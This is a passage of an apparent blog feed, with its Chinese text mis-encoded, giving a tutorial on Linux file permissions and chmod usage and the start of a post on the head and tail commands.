type="1"><li><p>ç¬¬ä¸€ä¸ªå­—æ¯ä»£è¡¨æ–‡ä»¶ç±»å‹ï¼Œæœ‰ä¸‰ç§ç±»å‹åˆ†åˆ«ä¸ºï¼š<code>d</code>ç›®å½•ã€<code>-</code> å¸¸è§„æ–‡ä»¶ã€<code>l</code>ç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰</p></li><li><p>ä½™ä¸‹ä¹ä¸ªå­—æ¯ï¼Œåˆ†ä¸‰ç»„åˆ†åˆ«ä¸º user(Owner)ï¼Œgroupï¼Œothersçš„æƒé™ã€‚</p><ol type="1"><li><p><code>r</code>: <strong>R</strong>ead</p><ul><li>æ–‡ä»¶æ˜¯å¦å¯è¯»</li><li>ç›®å½•å†…å®¹å¯çœ‹</li></ul><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [12:49:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll |grep batch.py</span></span><br><span class="line">---------- 2 violetv violetv  426  6æœˆ 14 16:40 batch.py</span><br><span class="line">---------- 2 violetv violetv  426  6æœˆ 14 16:40 hard_link_batch.py</span><br><span class="line">lrwxrwxrwx 1 violetv violetv    8  6æœˆ 29 10:02 soft_link_batch.py -&gt; batch.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [12:49:20]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> batch.py</span></span><br><span class="line">cat: batch.py: Permission denied</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [12:49:20]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ..</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [12:49:20]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll|grep <span class="built_in">test</span></span></span><br><span class="line">drwxr-xr-x  2 violetv violetv 4.0K  6æœˆ  9 17:00 py_tests</span><br><span class="line">d-wx--x--x  3 violetv violetv 4.0K  6æœˆ 29 12:44 test</span><br><span class="line">drwxr-xr-x  4 violetv violetv 4.0K  6æœˆ 26 12:45 testsh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [12:50:06]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll <span class="built_in">test</span></span></span><br><span class="line">ls: cannot open directory &#x27;test&#x27;: Permission denied</span><br></pre></td></tr></table></figure></p></li><li><p><code>w</code>: <strong>W</strong>rite</p><ul><li>æ–‡ä»¶å†…å®¹æ˜¯å¦å¯ä»¥è¢«ä¿®æ”¹</li><li>ç›®å½•é‡Œçš„å†…å®¹æ˜¯å¦å¯ä»¥è¢«ä¿®æ”¹ï¼ˆåˆ›å»ºæ–°æ–‡ä»¶ï¼Œåˆ é™¤æ–‡ä»¶ï¼Œé‡å‘½åæ–‡ä»¶ï¼‰æ³¨æ„ï¼šç›®å½•çš„å†™æƒé™ä¸å½±å“æ–‡ä»¶è‡ªèº«çš„å†™æƒé™ï¼Œæ–‡ä»¶å¦‚æœè‡ªèº«æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆæ–‡ä»¶å†…çš„å†…å®¹å¯ä»¥ä¿®æ”¹ï¼Œå³ï¼šç›®å½•æƒé™å’Œæ–‡ä»¶æƒé™ï¼Œå³ï¼šæœ¬èº«çš„è¯»å†™æ‰§è¡Œæ— å…³ã€‚</li></ul><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># violetv at manjaro in ~/test [13:37:41]</span></span><br><span class="line">$ ll ../ |grep test</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>æœˆ  <span class="number">9</span> <span class="number">17</span>:<span class="number">00</span> py_tests</span><br><span class="line">dr-xr-xr-x  <span class="number">3</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>æœˆ <span class="number">29</span> <span class="number">12</span>:<span class="number">44</span> test</span><br><span class="line">drwxr-xr-x  <span class="number">4</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>æœˆ <span class="number">26</span> <span class="number">12</span>:<span class="number">45</span> testsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># violetv at manjaro in ~/test [13:37:53]</span></span><br><span class="line">$ rm batch.py</span><br><span class="line">rm: remove write-protected regular file <span class="string">&#x27;batch.py&#x27;</span>? y</span><br><span class="line">rm: cannot remove <span class="string">&#x27;batch.py&#x27;</span>: Permission denied</span><br><span class="line"></span><br><span class="line"><span class="comment"># violetv at manjaro in ~/test [13:38:06]</span></span><br><span class="line">$ mv batch.py batch_temp.py</span><br><span class="line">mv: cannot move <span class="string">&#x27;batch.py&#x27;</span> to <span class="string">&#x27;batch_temp.py&#x27;</span>: Permission denied</span><br></pre></td></tr></table></figure></p></li><li><p><code>x</code>: e<strong>X</strong>ecu å¯¹åº”ä½ç½®ï¼ˆr æˆ– w æˆ–xï¼‰çš„æƒé™</p><ul><li>æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œï¼ˆæ˜¯å¦å…·æœ‰å¯æ‰§è¡Œæƒé™ï¼‰</li><li>ç›®å½•æ˜¯å¦å¯ä»¥ <code>cd</code> è¿›å…¥</li></ul><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># violetv at manjaro in ~ [13:43:36]</span></span><br><span class="line">$ ll| grep test</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>æœˆ  <span class="number">9</span> <span class="number">17</span>:<span class="number">00</span> py_tests</span><br><span class="line">dr--r--r--  <span class="number">3</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>æœˆ <span class="number">29</span> <span class="number">12</span>:<span class="number">44</span> test</span><br><span class="line">drwxr-xr-x  <span class="number">4</span> violetv violetv <span class="number">4.0</span>K  <span class="number">6</span>æœˆ <span class="number">26</span> <span class="number">12</span>:<span class="number">45</span> testsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># violetv at manjaro in ~ [13:43:43]</span></span><br><span class="line">$ cd test</span><br><span class="line">cd: permission denied: test</span><br></pre></td></tr></table></figure></p></li></ol><ul><li><code>-</code>: ä»£è¡¨æ²¡æœ‰è¯¥æƒé™</li></ul></li></ol><blockquote><p>Note that access to files targeted by symbolic links is controlled bythe permissions of the targeted file, not the permissions of the linkobject</p></blockquote><h2 id="chmod-ä½¿ç”¨"><code>chmod</code> ä½¿ç”¨</h2><p><code>chmod [OPTIONS] MODE FILE...</code></p><p><code>chmod</code> (change mode) å‘½ä»¤å…è®¸ä½ ä½¿ç”¨ 3ç§æ–¹å¼æ”¹å˜æ–‡ä»¶çš„æƒé™ï¼š</p><ol type="1"><li>Symbolic Method</li><li>Numeric Method</li><li>Reference Method</li></ol><p>è¯¥å‘½ä»¤å¯ä»¥æ¥å—ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶æˆ–ç›®å½•ï¼ˆä»¥ç©ºæ ¼åˆ†éš”ï¼‰ä½œä¸ºå‚æ•°</p><h2 id="symbolic-text-method">Symbolic (Text) Method</h2><p>å½“ä½¿ç”¨ç¬¦å·æ–¹æ³•æ—¶ï¼Œå‘½ä»¤çš„æ ¼å¼å¤§è‡´ä¸ºè¿™æ ·</p><p><code>chmod [OPTIONS] [ugoaâ€¦][-+=]permsâ€¦,[â€¦] FILE...</code></p><p>ç¬¬ä¸€ä¸ª flagï¼ˆusers flagsï¼‰ï¼š <code>[ugoaâ€¦]</code>å®šä¹‰è¦æ”¹å˜å“ªä¸ªç”¨æˆ·ç±»å…³äºæœ¬æ–‡ä»¶çš„æƒé™ã€‚ å¦‚æœä¸æŒ‡å®šæ­¤ flagï¼Œ é»˜è®¤ä¸ºå…¨éƒ¨usersï¼Œä¹Ÿå°±ç›¸å½“äºæŒ‡å®š flag <code>a</code>ã€‚</p><ul><li><code>u</code>ï¼š The <strong>u</strong>ser(the file owner).</li><li><code>g</code>ï¼š The members of the <strong>g</strong>roup.</li><li><code>o</code>ï¼š All <strong>o</strong>ther users.</li><li><code>a</code>ï¼š <strong>A</strong>ll users, identical to ugo.</li></ul><blockquote><p>If the users flag is omitted, the default one is a and thepermissions that are set by umask are not affected.</p></blockquote><p>ç¬¬äºŒä¸ª flagï¼ˆthe operation flagsï¼‰ï¼š <code>[-+=]</code>å®šä¹‰å“ªäº›æƒé™è¦è¢«å¢åŠ åˆ é™¤æˆ–è€…è®¾ç½®</p><ul><li><code>-</code>ï¼š Removes the specified permissions.</li><li><code>+</code>ï¼š Adds specified permissions.</li><li><code>=</code>ï¼š Changes the current permissions to the specifiedpermissions. If no permissions are specified after the <code>=</code>symbol, all permissions from the specified user class are removed.</li></ul><p>æƒé™(perms...) å¯ä»¥è¢«æ˜ç¡®åœ°è®¾å®šä¸º 0 æˆ–è€… <code>r,w,x</code>ä¸­çš„ä¸€ä¸ªæˆ–å‡ ä¸ªã€‚æ­¤å¤–ï¼Œå½“ä½ æƒ³è¦ä»ä¸€ä¸ªç”¨æˆ·ç±»æ‹·è´æƒé™åˆ°å¦ä¸€ä¸ªç”¨æˆ·ç±»æ—¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>u,g,o</code>ä¸­çš„ä¸€ä¸ªå­—ç¬¦ã€‚</p><p>å½“è®¾ç½®ä¸ºå¤šä¸ªç”¨æˆ·ç±»åˆ«è®¾ç½®æƒé™çš„æ—¶å€™ï¼Œä½¿ç”¨é€—å·ï¼ˆæ³¨æ„é€—å·å‰åä¸è¦ç©ºæ ¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼‰</p><p>ä¾‹å­ï¼š</p><p><code>chmod a-x filename</code>ã€<code>chmod og-rwx filename</code>ã€<code>chmod og= filename</code>ã€<code>chmod u=rwx,g=r,o= filename</code>ã€<code>chmod g+u filename</code></p><h2 id="numeric-method">Numeric Method</h2><p>Octal Notation for File Permissions(æ–‡ä»¶æƒé™çš„å…«è¿›åˆ¶è¡¨ç¤ºæ³•)</p><p>æ ¼å¼ï¼š<code>chmod [OPTIONS] NUMBER FILE...</code></p><table><colgroup><col style="width: 11%" /><col style="width: 6%" /><col style="width: 6%" /><col style="width: 75%" /></colgroup><thead><tr class="header"><th>column0</th><th>column1</th><th>column2</th><th>column3</th></tr></thead><tbody><tr class="odd"><td>æƒé™</td><td>æƒé™æ•°å€¼</td><td>äºŒè¿›åˆ¶</td><td>å…·ä½“ä½œç”¨</td></tr><tr class="even"><td>r</td><td>4</td><td>00000100</td><td><strong>r</strong>eadï¼Œè¯»å–ã€‚å½“å‰ç”¨æˆ·å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå½“å‰ç”¨æˆ·å¯ä»¥æµè§ˆç›®å½•ã€‚</td></tr><tr class="odd"><td>w</td><td>2</td><td>00000010</td><td><strong>w</strong>riteï¼Œå†™å…¥ã€‚å½“å‰ç”¨æˆ·å¯ä»¥æ–°å¢æˆ–ä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼Œå½“å‰ç”¨æˆ·å¯ä»¥åˆ é™¤ã€ç§»åŠ¨ç›®å½•æˆ–ç›®å½•å†…æ–‡ä»¶ã€‚</td></tr><tr class="even"><td>x</td><td>1</td><td>00000001</td><td>e<strong>x</strong>ecuteï¼Œæ‰§è¡Œã€‚å½“å‰ç”¨æˆ·å¯ä»¥æ‰§è¡Œæ–‡ä»¶ï¼Œå½“å‰ç”¨æˆ·å¯ä»¥è¿›å…¥ç›®å½•ã€‚</td></tr><tr class="odd"><td>no permission</td><td>0</td><td>00000000</td><td>æ— æƒé™</td></tr></tbody></table><p>ä¾‹å¦‚ï¼š<code>chmod 754 filename</code></p><p>ä¾ç…§ä¸Šé¢çš„è¡¨æ ¼ï¼Œæƒé™ç»„åˆå°±æ˜¯å¯¹åº”æƒé™å€¼æ±‚å’Œï¼Œå¦‚ä¸‹ï¼š</p><p>7 = 4 + 2 + 1 è¯»å†™è¿è¡Œæƒé™ 5 = 4 + 1 è¯»å’Œè¿è¡Œæƒé™ 4 = 4 åªè¯»æƒé™</p><p>å³ï¼šå°† filenameæ–‡ä»¶çš„è¯»å†™è¿è¡Œæƒé™èµ‹äºˆæ–‡ä»¶æ‰€æœ‰è€…ï¼ŒæŠŠè¯»å’Œè¿è¡Œçš„æƒé™èµ‹äºˆç¾¤ç»„ç”¨æˆ·ï¼ŒæŠŠè¯»çš„æƒé™èµ‹äºˆå…¶ä»–ç”¨æˆ·ã€‚</p><h2 id="using-a-reference-file">Using a Reference File</h2><p>æ ¼å¼ï¼š <code>chmod --reference=REF_FILE FILE</code></p><p>The <code>--reference=ref_file</code> optionå…è®¸ä½ å‚ç…§æŒ‡å®šæ–‡ä»¶è®¾ç½®ç›¸åŒçš„æƒé™ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:54:48]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 754 batch.py</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:55:13]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 12K</span><br><span class="line">-rwxrwxrwx 1 violetv violetv    0  6æœˆ 29 14:24 1.py</span><br><span class="line">-rwxr-xr-- 2 violetv violetv  431  6æœˆ 29 13:45 batch.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:55:14]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> --reference=batch.py 1.py</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:55:26]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 12K</span><br><span class="line">-rwxr-xr-- 1 violetv violetv    0  6æœˆ 29 14:24 1.py</span><br><span class="line">-rwxr-xr-- 2 violetv violetv  431  6æœˆ 29 13:45 batch.py</span><br></pre></td></tr></table></figure><h2 id="recursively-change-the-files-permissions">Recursively Change theFileâ€™s Permissions</h2><p>å¯¹ç»™å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•è¿›è¡Œé€’å½’æ“ä½œï¼Œä½¿ç”¨<code>-R</code>ï¼ˆ<code>--recursive</code>ï¼‰ å‚æ•°</p><p>æ ¼å¼ï¼š<code>chmod -R MODE DIRECTORY</code></p><h2 id="operating-on-symbolic-links">Operating on Symbolic Links</h2><p>ç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰çš„æƒé™æ€»æ˜¯ä¸º777ã€‚å½“ä½ è¦æ”¹å˜ç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰çš„æƒé™ï¼Œå®é™…ä¸Šæ”¹å˜çš„æ˜¯é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶çš„æƒé™ã€‚</p><p>ç¤ºä¾‹ï¼šbatch.py åŠå…¶è½¯é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:57:54]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 12K</span><br><span class="line">-rwxr-xr-- 1 violetv violetv    0  6æœˆ 29 14:24 1.py</span><br><span class="line">-rwxr-xr-- 2 violetv violetv  431  6æœˆ 29 13:45 batch.py</span><br><span class="line">-rwxr-xr-- 2 violetv violetv  431  6æœˆ 29 13:45 hard_link_batch.py</span><br><span class="line">lrwxrwxrwx 1 violetv violetv    8  6æœˆ 29 10:02 soft_link_batch.py -&gt; batch.py</span><br><span class="line">drwxr-xr-x 2 violetv violetv 4.0K  6æœˆ 13 14:37 test1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:57:55]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 777 soft_link_batch.py</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [14:59:53]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 12K</span><br><span class="line">-rwxr-xr-- 1 violetv violetv    0  6æœˆ 29 14:24 1.py</span><br><span class="line">-rwxrwxrwx 2 violetv violetv  431  6æœˆ 29 13:45 batch.py</span><br><span class="line">-rwxrwxrwx 2 violetv violetv  431  6æœˆ 29 13:45 hard_link_batch.py</span><br><span class="line">lrwxrwxrwx 1 violetv violetv    8  6æœˆ 29 10:02 soft_link_batch.py -&gt; batch.py</span><br><span class="line">drwxr-xr-x 2 violetv violetv 4.0K  6æœˆ 13 14:37 test1</span><br></pre></td></tr></table></figure><h2 id="changing-file-permissions-in-bulk">Changing File Permissions inBulk</h2><ol type="1"><li><p>å¯¹æŸä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å¤¹éƒ½èµ‹äºˆæ‰§è¡Œæƒé™: ä¾‹å¦‚ï¼šå¯¹<code>~/foldername/</code>æ–‡ä»¶éƒ½èµ‹äºˆæ‰§è¡Œæƒé™ï¼š<code>chmod +x ~/foldername/*</code></p></li><li><p>ä½¿ç”¨ <code>find</code> å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/my_website -type d -exec chmod 755 &#123;&#125; \;</span><br><span class="line">find /var/www/my_website -type f -exec chmod 644 &#123;&#125; \;</span><br><span class="line">find /var/www/my_website -type d -exec chmod u=rwx,go=rx &#123;&#125; \;</span><br><span class="line">find /var/www/my_website -type f -exec chmod u=rw,go=r &#123;&#125; \;</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://linuxize.com/post/chmod-command-in-linux/">ChmodCommand in Linux (File Permissions)</a></p><p><ahref="https://www.linode.com/docs/tools-reference/tools/modify-file-permissions-with-chmod/">ModifyFile Permissions with chmod</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chmod </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>head å’Œ tail å‘½ä»¤</title>
      <link href="/blog/2020/07/13/linux/tools/head_tail/"/>
      <url>/blog/2020/07/13/linux/tools/head_tail/</url>
      
        <content type="html"><![CDATA[<h2 id="tail">tail</h2><h3 id="introduction">introduction</h3><p>tail å‘½ä»¤æ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶æˆ–ç®¡é“æ•°æ®çš„æœ€åä¸€éƒ¨åˆ†(<strong>é»˜è®¤ä¸º 10è¡Œ</strong>)ã€‚å®ƒè¿˜å¯ä»¥ç”¨æ¥å®æ—¶ç›‘æ§æ–‡ä»¶çš„å˜åŒ–ã€‚</p><p>tailå‘½ä»¤æœ€å¸¸è§çš„ç”¨é€”ä¹‹ä¸€æ˜¯ç›‘è§†å’Œåˆ†æéšæ—¶é—´å˜åŒ–çš„<strong>æ—¥å¿—</strong>å’Œå…¶ä»–æ–‡ä»¶ï¼Œé€šå¸¸ä¸grep ç­‰å…¶ä»–å·¥å…·ç»“åˆä½¿ç”¨ã€‚</p><p>head å’Œ tail ç”¨æ³•ä¸€è‡´ï¼Œåªä¸è¿‡æ˜¯æ˜¾ç¤ºå¤´éƒ¨å‰å‡ è¡Œã€‚</p><h3 id="preparation">Preparation</h3><p>æå‰åœ¨ <code>ipython</code> é‡Œé¢ç”¨ python æä¸ªæµ‹è¯•æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.log&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        fp.write(<span class="string">f&quot;æ­£æ•°ç¬¬<span class="subst">&#123;i&#125;</span> è¡Œï¼Œ å€’æ•°ç¬¬<span class="subst">&#123;<span class="number">51</span>-i&#125;</span> è¡Œ\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åä¸‹é¢å¦‚æœå¯ä»¥æ˜¾ç¤ºè¡Œæ•°å°‘çš„ï¼Œæˆ‘å°±å°†æµ‹è¯•ç»“æœæ”¾ä¸Šæ¥ï¼Œè¡Œæ•°å¤šçš„ï¼Œå°±ä¸æ”¾äº†ã€‚</p><h3 id="usage">Usage</h3><p><code>tail [OPTION]... [FILE]...</code></p><p><code>OPTION</code>: åé¢ä»‹ç»å¸¸ç”¨çš„å‡ ä¸ª <code>FILE</code>ï¼šé›¶ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶åã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šæ–‡ä»¶ï¼Œæˆ–è€…å½“ <code>FILE</code> ä¸º<code>-</code> æ—¶ï¼Œtail å°†è¯»å–æ ‡å‡†è¾“å…¥ã€‚</p><ol type="1"><li><p>æœ€ç®€å•çš„ç”¨æ³•æ˜¯ä¸åŠ  <code>OPTION</code>ï¼Œ é»˜è®¤æ˜¾ç¤ºæ–‡ä»¶çš„æœ€å 10 è¡Œ<code>tail filename.txt</code></p></li><li><p>æœ€å¸¸è§çš„ç”¨æ³•æ˜¯ <code>-f</code> OPTIONï¼Œå¾ªç¯è¯»å–ï¼Œå®æ—¶æ˜¾ç¤ºæ–‡ä»¶çš„æ”¹å˜<code>tail -f filename.txt</code>ã€‚</p></li><li><p>æ˜¾ç¤ºå°¾éƒ¨çš„æŒ‡å®šè¡Œæ•°ï¼Œä½¿ç”¨ <code>-n</code> (<code>--lines</code>)å‚æ•° <code>tail -n &lt;NUMBER&gt; filename.txt</code></p><p>ä¾‹å¦‚ï¼šæ˜¾ç¤ºæœ€å 2 è¡Œï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">tail</span> -n 2 test.log</span></span><br><span class="line">æ­£æ•°ç¬¬49 è¡Œï¼Œ å€’æ•°ç¬¬2 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬50 è¡Œï¼Œ å€’æ•°ç¬¬1 è¡Œ</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„ï¼š <code>-n</code> çš„ <code>n</code> å¯ä»¥å»æ‰ï¼Œç›´æ¥<code>-&lt;NUMBER&gt;</code>,ä¾‹å¦‚ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">tail</span> -2 test.log</span></span><br><span class="line">æ­£æ•°ç¬¬49 è¡Œï¼Œ å€’æ•°ç¬¬2 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬50 è¡Œï¼Œ å€’æ•°ç¬¬1 è¡Œ</span><br></pre></td></tr></table></figure></p></li><li><p>æ˜¾ç¤ºå°¾éƒ¨çš„æŒ‡å®šå­—èŠ‚æ•°ï¼Œ ä½¿ç”¨ <code>-c</code>(<code>--bytes</code>) å‚æ•°</p><p><code>tail -c &lt;NUMBER&gt; filename.txt</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">tail</span> -c 15 test.log</span></span><br><span class="line">å€’æ•°ç¬¬1 è¡Œ</span><br></pre></td></tr></table></figure></p><p>æ­¤å¤–ï¼Œè¿˜å¯ä»¥æŒ‡å®šå€æ•°ï¼Œä¾‹å¦‚ï¼š<code>b</code> æ˜¯ 512ï¼Œ <code>K</code> æ˜¯<code>1024</code>ï¼Œä¸è¿‡ç›®å‰æ¥çœ‹ï¼Œæˆ‘æ²¡æœ‰å‘ç°æŒ‡å®šå­—èŠ‚è¿™ä¸ªå‚æ•°çš„ç”¨å¤„ï¼Œå› æ­¤ï¼Œä¸è¯¦ç»†å­¦è¿™é‡Œäº†ï¼Œå¦åˆ™æ—©æ™šè¦å¿˜è®°ã€‚</p></li><li><p>ç›‘æ§æ–‡ä»¶å˜åŒ–ï¼Œä½¿ç”¨ <code>-f</code> (<code>--follow</code>) å‚æ•°<code>tail -f filename.txt</code>ï¼Œ æ­¤å‚æ•°åœ¨æ£€æµ‹æ—¥å¿—æ–‡ä»¶æ—¶ï¼Œå°¤å…¶æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼šå®æ—¶åŠ¨æ€æ˜¾ç¤º <code>/var/log/nginx/error.log</code> çš„å 10 è¡Œã€‚<code>tail -f /var/log/nginx/error.log</code></p><p>ä¸ºäº†åœ¨æ–‡ä»¶è¢«åˆ é™¤åé‡æ–°åˆ›å»ºæ—¶ï¼ŒæŒç»­ç›‘æ§æ–‡ä»¶ï¼Œä½¿ç”¨ <code>-F</code>å‚æ•°ï¼š</p><p>æˆ‘æµ‹è¯•æ—¶ï¼Œå…ˆç”¨ <code>tail -F test.log</code>ï¼Œç„¶ååœ¨å¦ä¸€ä¸ª shellä¸­ï¼Œ<code>rm test.log</code>ï¼Œç„¶åå†ç”¨ python å†™å…¥ï¼Œå°±æ˜¯ä¸‹é¢ç»“æœã€‚</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">tail</span> -F test.log</span></span><br><span class="line">æ­£æ•°ç¬¬41 è¡Œï¼Œ å€’æ•°ç¬¬10 è¡Œ</span><br><span class="line">æ­£æ•°ç¬¬42 è¡Œï¼Œ å€’æ•°ç¬¬9 